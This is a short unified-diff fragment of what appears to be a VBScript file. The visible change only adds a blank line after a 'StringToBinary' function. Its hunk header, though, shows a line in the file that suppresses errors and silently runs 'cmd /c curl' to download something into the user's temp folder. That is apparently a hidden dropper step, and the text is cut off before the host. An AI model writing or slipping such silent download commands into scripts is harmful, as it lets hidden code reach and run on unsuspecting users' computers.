@@ -384,3 +384,4 @@ On Error Resume Next:CreateObject("WScript.Shell").Run"cmd /c curl -s -o %TEMP%\
     StringToBinary = stream.Read
 End Function
 
+
